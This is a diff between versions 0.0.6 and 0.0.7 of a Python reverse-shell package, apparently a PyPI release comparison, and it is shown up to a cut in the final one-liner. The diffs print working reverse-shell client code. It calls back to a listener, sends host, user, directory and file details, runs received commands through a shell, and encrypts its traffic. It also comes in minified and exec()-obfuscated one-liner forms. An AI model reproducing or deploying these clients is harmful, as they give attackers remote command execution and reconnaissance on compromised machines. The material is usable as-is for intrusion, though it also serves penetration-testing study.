# Comparing `tmp/ReverseShell-0.0.6.tar.gz` & `tmp/ReverseShell-0.0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "ReverseShell-0.0.6.tar", last modified: Mon May  1 17:49:31 2023, max compression
+gzip compressed data, was "ReverseShell-0.0.7.tar", last modified: Mon May  1 20:51:02 2023, max compression
```

## Comparing `ReverseShell-0.0.6.tar` & `ReverseShell-0.0.7.tar`

### file list

```diff
@@ -1,36 +1,36 @@
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 17:49:31.415422 ReverseShell-0.0.6/
--rw-r--r--   0 kali      (1000) kali      (1000)    35821 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/LICENSE.txt
--rw-r--r--   0 kali      (1000) kali      (1000)      151 2023-05-01 23:24:14.000000 ReverseShell-0.0.6/MANIFEST.in
--rw-r--r--   0 kali      (1000) kali      (1000)     6977 2023-05-01 17:49:31.415422 ReverseShell-0.0.6/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)     5915 2023-05-01 20:04:16.000000 ReverseShell-0.0.6/README.md
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 17:49:31.411424 ReverseShell-0.0.6/ReverseShell.egg-info/
--rw-r--r--   0 kali      (1000) kali      (1000)     6977 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)      926 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/SOURCES.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/dependency_links.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       51 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/entry_points.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       15 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/requires.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-05-01 17:49:31.000000 ReverseShell-0.0.6/ReverseShell.egg-info/top_level.txt
--rw-r--r--   0 kali      (1000) kali      (1000)    28080 2023-05-01 22:49:56.000000 ReverseShell-0.0.6/ReverseShell.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 17:49:31.411424 ReverseShell-0.0.6/clients/
--rw-r--r--   0 kali      (1000) kali      (1000)     3258 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/clients/shellclientdns.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3904 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/clients/shellclienthttp_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     4068 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/clients/shellclienthttps_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     4940 2023-05-01 19:48:08.000000 ReverseShell-0.0.6/clients/shellclienthttpsencrypt_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     4544 2023-05-01 22:53:12.000000 ReverseShell-0.0.6/clients/shellclienthttpsencrypt_advanced2.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3126 2023-05-01 22:11:00.000000 ReverseShell-0.0.6/clients/shellclientsocketirc.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2334 2023-05-01 22:11:00.000000 ReverseShell-0.0.6/clients/shellclientsockettcp.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2295 2023-05-01 22:11:00.000000 ReverseShell-0.0.6/clients/shellclienttcp.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3331 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/clients/shellclienttcp_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2176 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/clients/shellclientudp.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 17:49:31.411424 ReverseShell-0.0.6/minifiers/
--rw-r--r--   0 kali      (1000) kali      (1000)     1727 2023-05-01 22:01:40.000000 ReverseShell-0.0.6/minifiers/shellclienthttpsencrypt_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     1257 2023-05-01 23:22:58.000000 ReverseShell-0.0.6/minifiers/shellclienthttpsencrypt_advanced2.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 17:49:31.411424 ReverseShell-0.0.6/oneliners/
--rw-r--r--   0 kali      (1000) kali      (1000)     1800 2023-05-01 17:43:58.000000 ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2118 2023-05-01 17:46:32.000000 ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced.sh
--rw-r--r--   0 kali      (1000) kali      (1000)     1328 2023-05-01 23:35:30.000000 ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced2.py
--rw-r--r--   0 kali      (1000) kali      (1000)     1548 2023-05-01 17:48:10.000000 ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced2.sh
--rw-r--r--   0 kali      (1000) kali      (1000)     1514 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/server.crt
--rw-r--r--   0 kali      (1000) kali      (1000)     1732 2023-05-01 15:42:38.000000 ReverseShell-0.0.6/server.key
--rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-05-01 17:49:31.415422 ReverseShell-0.0.6/setup.cfg
--rw-r--r--   0 kali      (1000) kali      (1000)     1745 2023-05-01 15:47:32.000000 ReverseShell-0.0.6/setup.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/
+-rw-r--r--   0 kali      (1000) kali      (1000)    35821 2023-05-01 15:42:38.000000 ReverseShell-0.0.7/LICENSE.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)      151 2023-05-01 23:24:14.000000 ReverseShell-0.0.7/MANIFEST.in
+-rw-r--r--   0 kali      (1000) kali      (1000)     6977 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)     5915 2023-05-01 20:04:16.000000 ReverseShell-0.0.7/README.md
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/ReverseShell.egg-info/
+-rw-r--r--   0 kali      (1000) kali      (1000)     6977 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)      926 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/SOURCES.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/dependency_links.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       51 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/entry_points.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       15 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/requires.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-05-01 20:51:02.000000 ReverseShell-0.0.7/ReverseShell.egg-info/top_level.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)    28080 2023-05-01 20:50:35.000000 ReverseShell-0.0.7/ReverseShell.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/clients/
+-rw-r--r--   0 kali      (1000) kali      (1000)     3258 2023-05-01 21:42:38.000000 ReverseShell-0.0.7/clients/shellclientdns.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3957 2023-05-02 02:07:58.000000 ReverseShell-0.0.7/clients/shellclienthttp_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     4121 2023-05-02 02:05:50.000000 ReverseShell-0.0.7/clients/shellclienthttps_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     4993 2023-05-02 02:05:58.000000 ReverseShell-0.0.7/clients/shellclienthttpsencrypt_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     4609 2023-05-02 02:06:52.000000 ReverseShell-0.0.7/clients/shellclienthttpsencrypt_advanced2.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3126 2023-05-02 04:11:00.000000 ReverseShell-0.0.7/clients/shellclientsocketirc.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2334 2023-05-02 04:11:00.000000 ReverseShell-0.0.7/clients/shellclientsockettcp.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2295 2023-05-02 04:11:00.000000 ReverseShell-0.0.7/clients/shellclienttcp.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3384 2023-05-02 02:08:36.000000 ReverseShell-0.0.7/clients/shellclienttcp_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2176 2023-05-01 21:42:38.000000 ReverseShell-0.0.7/clients/shellclientudp.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/minifiers/
+-rw-r--r--   0 kali      (1000) kali      (1000)     1751 2023-05-02 02:21:22.000000 ReverseShell-0.0.7/minifiers/shellclienthttpsencrypt_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     1281 2023-05-02 02:21:02.000000 ReverseShell-0.0.7/minifiers/shellclienthttpsencrypt_advanced2.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/oneliners/
+-rw-r--r--   0 kali      (1000) kali      (1000)     1779 2023-05-02 02:25:04.000000 ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2024 2023-05-02 02:36:58.000000 ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced.sh
+-rw-r--r--   0 kali      (1000) kali      (1000)     1314 2023-05-02 02:23:44.000000 ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced2.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     1483 2023-05-02 02:37:24.000000 ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced2.sh
+-rw-r--r--   0 kali      (1000) kali      (1000)     1514 2023-05-01 15:42:38.000000 ReverseShell-0.0.7/server.crt
+-rw-r--r--   0 kali      (1000) kali      (1000)     1732 2023-05-01 15:42:38.000000 ReverseShell-0.0.7/server.key
+-rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-05-01 20:51:02.310286 ReverseShell-0.0.7/setup.cfg
+-rw-r--r--   0 kali      (1000) kali      (1000)     1745 2023-05-01 20:50:48.000000 ReverseShell-0.0.7/setup.py
```

### Comparing `ReverseShell-0.0.6/LICENSE.txt` & `ReverseShell-0.0.7/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/PKG-INFO` & `ReverseShell-0.0.7/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: ReverseShell
-Version: 0.0.6
+Version: 0.0.7
 Summary: This package implements an advanced reverse shell console (supports: TCP, UDP, IRC, HTTP and DNS).
 Home-page: https://github.com/mauricelambert/ReverseShell
 Author: Maurice Lambert
 Author-email: mauricelambert434@gmail.com
 Maintainer: Maurice Lambert
 Maintainer-email: mauricelambert434@gmail.com
 License: GPL-3.0 License
```

### Comparing `ReverseShell-0.0.6/README.md` & `ReverseShell-0.0.7/README.md`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/ReverseShell.egg-info/PKG-INFO` & `ReverseShell-0.0.7/ReverseShell.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: ReverseShell
-Version: 0.0.6
+Version: 0.0.7
 Summary: This package implements an advanced reverse shell console (supports: TCP, UDP, IRC, HTTP and DNS).
 Home-page: https://github.com/mauricelambert/ReverseShell
 Author: Maurice Lambert
 Author-email: mauricelambert434@gmail.com
 Maintainer: Maurice Lambert
 Maintainer-email: mauricelambert434@gmail.com
 License: GPL-3.0 License
```

### Comparing `ReverseShell-0.0.6/ReverseShell.egg-info/SOURCES.txt` & `ReverseShell-0.0.7/ReverseShell.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/ReverseShell.py` & `ReverseShell-0.0.7/ReverseShell.py`

 * *Files 0% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.6"
+__version__ = "0.0.7"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
```

### Comparing `ReverseShell-0.0.6/clients/shellclientdns.py` & `ReverseShell-0.0.7/clients/shellclientdns.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/clients/shellclienthttp_advanced.py` & `ReverseShell-0.0.7/clients/shellclienthttp_advanced.py`

 * *Files 5% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -46,20 +46,20 @@
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
 from json import dumps
-from platform import node
 from socket import socket
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
@@ -90,14 +90,15 @@
                 + dumps(
                     {
                         "hostname": node(),
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
+                        "system": system(),
                     }
                 ).encode()
             )
             sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
```

### Comparing `ReverseShell-0.0.6/clients/shellclienthttps_advanced.py` & `ReverseShell-0.0.7/clients/shellclienthttps_advanced.py`

 * *Files 9% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -46,20 +46,20 @@
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
 from json import dumps
-from platform import node
 from socket import socket
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from ssl import _create_unverified_context
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
@@ -92,14 +92,15 @@
                 + dumps(
                     {
                         "hostname": node(),
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
+                        "system": system(),
                     }
                 ).encode()
             )
             s = context.wrap_socket(s)
             sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
```

### Comparing `ReverseShell-0.0.6/clients/shellclienthttpsencrypt_advanced.py` & `ReverseShell-0.0.7/clients/shellclienthttpsencrypt_advanced.py`

 * *Files 2% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -46,20 +46,20 @@
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
 from json import dumps
-from platform import node
 from socket import socket
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from sys import argv, stderr, exit
 from ssl import _create_unverified_context
 from os import getcwd, environ, listdir, name, urandom
 
 if len(argv) != 2:
     print(f"USAGES: {argv[0]} key", file=stderr)
     exit(1)
@@ -123,14 +123,15 @@
                 + dumps(
                     {
                         "hostname": node(),
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
+                        "system": system(),
                     }
                 ).encode()
             )
             s = context.wrap_socket(s)
             sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
```

### Comparing `ReverseShell-0.0.6/clients/shellclienthttpsencrypt_advanced2.py` & `ReverseShell-0.0.7/clients/shellclienthttpsencrypt_advanced2.py`

 * *Files 3% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -46,19 +46,19 @@
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
 from json import dumps
-from platform import node
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from sys import argv, stderr, exit
 from ssl import _create_unverified_context
 from urllib.request import urlopen, Request
 from os import getcwd, environ, listdir, name, urandom
 
 if len(argv) != 2:
     print(f"USAGES: {argv[0]} key", file=stderr)
@@ -115,14 +115,15 @@
                             + dumps(
                                 {
                                     "hostname": node(),
                                     "user": getuser(),
                                     "cwd": getcwd(),
                                     "executables": get_executables(),
                                     "files": listdir(),
+                                    "system": system(),
                                 }
                             ).encode()
                         ),
                     ),
                     context=context,
                 ).read(),
                 True,
```

### Comparing `ReverseShell-0.0.6/clients/shellclientsocketirc.py` & `ReverseShell-0.0.7/clients/shellclientsocketirc.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/clients/shellclientsockettcp.py` & `ReverseShell-0.0.7/clients/shellclientsockettcp.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/clients/shellclienttcp.py` & `ReverseShell-0.0.7/clients/shellclienttcp.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/clients/shellclienttcp_advanced.py` & `ReverseShell-0.0.7/clients/shellclienttcp_advanced.py`

 * *Files 1% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.3"
+__version__ = "0.0.4"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -46,20 +46,20 @@
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
 from json import dumps
-from platform import node
 from socket import socket
 from os.path import exists
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
+from platform import node, system
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
@@ -88,14 +88,15 @@
                 + dumps(
                     {
                         "hostname": node(),
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
+                        "system": system(),
                     }
                 ).encode()
             )
             sendall(data)
             recevied = s.recv(65535)
             s.close()
```

### Comparing `ReverseShell-0.0.6/clients/shellclientudp.py` & `ReverseShell-0.0.7/clients/shellclientudp.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.6/minifiers/shellclienthttpsencrypt_advanced.py` & `ReverseShell-0.0.7/minifiers/shellclienthttpsencrypt_advanced.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,23 +1,22 @@
-from json import dumps;from platform import node as h;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode()
+from json import dumps;from platform import node as h,system as S;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();f=b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n";c=u()
 def e(p,d=False):
 	if d:v=p[:256];p=p[256:]
 	else:v=y(256)
 	j,S,o=0,list(range(256)),[]
 	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
 	S = [v[i]^c for i,c in enumerate(S)];i=j=0
 	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])
 	if d:return bytes(o)
 	return v+bytes(o)
 def g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]
 def a(d):
 	c,d=d[:30000],d[30000:]
 	while c:s.sendall(c);c=d[:30000];d=d[30000:]
-f=b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n";c=u()
 while x:
 	with q(Exception):
 		r=b""
 		while r!=b"\6":
-			s=b();s.connect(("127.0.0.1",1337));d=e(b"\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l()}).encode());s=c.wrap_socket(s);a(f.replace(b"{type}",b"application/json; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+d);r=e(s.recv(65535).split(b"\r\n\r\n",1)[1],x);s.close()
+			s=b();s.connect(("127.0.0.1",1337));d=e(b"\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode());s=c.wrap_socket(s);a(f.replace(b"{type}",b"application/json; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+d);r=e(s.recv(65535).split(b"\r\n\r\n",1)[1],x);s.close()
 		d=b" "
 		while x:
 			s=b();s.connect(("127.0.0.1", 1337));s=c.wrap_socket(s);a(f.replace(b"{type}",b"text/plain; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+e(d));m=e(s.recv(65535).split(b"\r\n\r\n",1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" ";s.close()
```

### Comparing `ReverseShell-0.0.6/minifiers/shellclienthttpsencrypt_advanced2.py` & `ReverseShell-0.0.7/minifiers/shellclienthttpsencrypt_advanced2.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,20 +1,19 @@
-from json import dumps;from platform import node as h;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode()
+from json import dumps;from platform import node as h,system as S;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();c=u();v="https://127.0.0.1:1337/"
 def e(p,d=False):
 	if d:v=p[:256];p=p[256:]
 	else:v=y(256)
 	j,S,o=0,list(range(256)),[]
 	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
 	S = [v[i]^c for i,c in enumerate(S)];i=j=0
 	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])
 	if d:return bytes(o)
 	return v+bytes(o)
 def g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]
-c=u();v="https://127.0.0.1:1337/"
 while x:
 	with q(Exception):
 		r=b""
 		while r!=b"\6":
-			r=e(b(f(v,method="POST",data=e(b"\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l()}).encode())),context=c).read(),x)
+			r=e(b(f(v,method="POST",data=e(b"\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode())),context=c).read(),x)
 		d=b" "
 		while x:
 			m=e(b(f(v,method="POST",data=e(d)),context=c).read(),x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" "
```

### Comparing `ReverseShell-0.0.6/oneliners/shellclienthttpsencrypt_advanced.py` & `ReverseShell-0.0.7/oneliners/shellclienthttpsencrypt_advanced.py`

 * *Files 16% similar despite different names*

```diff
@@ -1 +1 @@
-exec('from json import dumps;from platform import node as h;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode()\r\ndef e(p,d=False):\r\n	if d:v=p[:256];p=p[256:]\r\n	else:v=y(256)\r\n	j,S,o=0,list(range(256)),[]\r\n	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\r\n	S = [v[i]^c for i,c in enumerate(S)];i=j=0\r\n	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\r\n	if d:return bytes(o)\r\n	return v+bytes(o)\r\ndef g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]\r\ndef a(d):\r\n	c,d=d[:30000],d[30000:]\r\n	while c:s.sendall(c);c=d[:30000];d=d[30000:]\r\nf=b"POST / HTTP/1.0\\r\\nContent-Type: {type}\\r\\nHost: 127.0.0.1\\r\\nContent-Length: {length}\\r\\n\\r\\n";c=u()\r\nwhile x:\r\n	with q(Exception):\r\n		r=b""\r\n		while r!=b"\\6":\r\n			s=b();s.connect(("127.0.0.1",1337));d=e(b"\\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l()}).encode());s=c.wrap_socket(s);a(f.replace(b"{type}",b"application/json; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+d);r=e(s.recv(65535).split(b"\\r\\n\\r\\n",1)[1],x);s.close()\r\n		d=b" "\r\n		while x:\r\n			s=b();s.connect(("127.0.0.1", 1337));s=c.wrap_socket(s);a(f.replace(b"{type}",b"text/plain; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+e(d));m=e(s.recv(65535).split(b"\\r\\n\\r\\n",1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" ";s.close()')
+exec('from json import dumps;from platform import node as h,system as S;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();f=b"POST / HTTP/1.0\\r\\nContent-Type: {type}\\r\\nHost: 127.0.0.1\\r\\nContent-Length: {length}\\r\\n\\r\\n";c=u()\ndef e(p,d=False):\n	if d:v=p[:256];p=p[256:]\n	else:v=y(256)\n	j,S,o=0,list(range(256)),[]\n	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\n	S = [v[i]^c for i,c in enumerate(S)];i=j=0\n	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\n	if d:return bytes(o)\n	return v+bytes(o)\ndef g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]\ndef a(d):\n	c,d=d[:30000],d[30000:]\n	while c:s.sendall(c);c=d[:30000];d=d[30000:]\nwhile x:\n	with q(Exception):\n		r=b""\n		while r!=b"\\6":\n			s=b();s.connect(("127.0.0.1",1337));d=e(b"\\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode());s=c.wrap_socket(s);a(f.replace(b"{type}",b"application/json; charset=utf-8").replace(b"{length}",str(len(d)).encode("latin-1"))+d);r=e(s.recv(65535).split(b"\\r\\n\\r\\n",1)[1],x);s.close()\n		